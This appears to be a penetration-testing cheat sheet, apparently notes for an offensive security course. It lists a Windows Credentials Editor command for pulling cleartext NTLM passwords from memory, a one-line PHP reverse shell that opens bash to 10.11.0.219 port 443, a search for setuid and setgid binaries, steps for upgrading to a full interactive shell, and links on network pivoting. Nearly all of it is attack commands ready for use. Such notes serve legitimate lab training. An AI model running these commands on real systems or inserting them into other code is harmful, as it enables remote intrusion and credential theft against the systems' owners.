
### Windows Credencial Editor (WCE)

WCE can steal NTLM passwords from memory in cleartext! There are different versions of WCE, one for 32 bit systems and one for 64 bit. So make sure you have the right one.

```
wce32.exe -w
```

***

## Linux Privilege Escalation

Check to see what sudo privileges the current user has:

```
sudo -l
```

One-line PHP reverse shell:

```
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.11.0.219/443 0>&1'");
```

Create a new file within terminal:

```
#!/bin/sh
cat > test << EOF
Hello World!
This is my stupid text file.

You
can also
have
a whole lot
more text and
lines
EOF
```

Find setgid and setuid binaries:
```
find / -xdev -type f \( -perm -4000 -o -perm -2000 \) -ls
```

***

## Interactive Shell

Bread and butter interactive shell:

1. `python -c "import pty; pty.spawn('/bin/bash')"`
2. `Ctrl + Z`
3. `stty raw -echo`
4. `fg`

***

## Pivoting

[https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html](https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html)

[https://artkond.com/2017/03/23/pivoting-guide/](https://artkond.com/2017/03/23/pivoting-guide/)

[https://www.ivoidwarranties.tech/posts/pentesting-tuts/pivoting/proxychains/](https://www.ivoidwarranties.tech/posts/pentesting-tuts/pivoting/proxychains/)